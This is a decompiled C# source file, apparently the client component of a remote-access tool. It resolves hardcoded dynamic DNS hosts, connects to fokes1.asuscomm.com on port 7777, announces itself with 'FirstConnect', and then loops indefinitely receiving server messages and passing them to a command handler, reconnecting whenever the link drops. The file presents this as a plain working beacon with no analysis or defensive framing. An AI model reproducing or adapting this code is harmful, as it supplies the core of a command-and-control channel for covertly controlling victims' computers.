using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;

namespace ClientWorker
{
	// Token: 0x02000002 RID: 2
	public class Client
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		public Client()
		{
			Log.Send("Client.Client()");
			this.handler = new Functions();
			this.handler.Start();
		}

		// Token: 0x06000002 RID: 2 RVA: 0x000020A0 File Offset: 0x000002A0
		public void Clear()
		{
			Log.Send("Client.Clear()");
			this.client.Close();
			this.stream.Close();
			this.client = (this.client = new TcpClient(this.address, this.port));
			this.stream = this.client.GetStream();
		}

		// Token: 0x06000003 RID: 3 RVA: 0x00002104 File Offset: 0x00000304
		public void Start()
		{
			Log.Send("Client.Start");
			this.client = null;
			try
			{
				this.address = this.GetFirstSucsessAdress();
				StartData.currentUser = this.address;
				Log.Send("SucsessIp: " + this.address);
				this.client = new TcpClient(this.address, this.port);
				this.stream = this.client.GetStream();
				string text = "FirstConnect";
				byte[] array = Encoding.Unicode.GetBytes(text);
				this.stream.Write(array, 0, array.Length);
				Log.Send("Отправлено: " + text);
				for (;;)
				{
					array = new byte[64];
					this.builder = new StringBuilder();
					do
					{
						int count = this.stream.Read(array, 0, array.Length);
						this.builder.Append(Encoding.Unicode.GetString(array, 0, count));
					}
					while (this.stream.DataAvailable);
					text = this.builder.ToString();
					Log.Send("Сервер: " + text);
					this.handler.AnalysisAnswer(text);
				}
			}
			catch (Exception ex)
			{
				Log.Send(ex.Message);
				this.handler.Reconnect();
			}
			finally
			{
				try
				{
					this.client.Close();
					Log.Send("Tcp connected close");
				}
				catch (Exception ex2)
				{
					Log.Send("Tcp connected cant close" + ex2.Message);
				}
			}
		}

		// Token: 0x06000004 RID: 4 RVA: 0x000022DC File Offset: 0x000004DC
		private IPAddress[] GetIpDns(string ddns)
		{
			return Dns.GetHostAddresses(ddns);
		}

		// Token: 0x06000005 RID: 5 RVA: 0x000022F8 File Offset: 0x000004F8
		private IPStatus PingIp(string hostName)
		{
			Ping ping = new Ping();
			PingReply pingReply = ping.Send(hostName);
			return pingReply.Status;
		}

		// Token: 0x06000006 RID: 6 RVA: 0x00002320 File Offset: 0x00000520
		private string GetFirstSucsessAdress()
		{
			string result = "";
			foreach (string text in StartData.ddnsHostName)
			{
				bool flag = this.PingIp(text) == IPStatus.Success;
				if (flag)
				{
					return text;
				}
			}
			return result;
		}

		// Token: 0x04000001 RID: 1
		private int port = 7777;

		// Token: 0x04000002 RID: 2
		private string address = "fokes1.asuscomm.com";

		// Token: 0x04000003 RID: 3
		public TcpClient client;

		// Token: 0x04000004 RID: 4
		public NetworkStream stream;

		// Token: 0x04000005 RID: 5
		private StringBuilder builder;

		// Token: 0x04000006 RID: 6
		public Functions handler;
	}
}
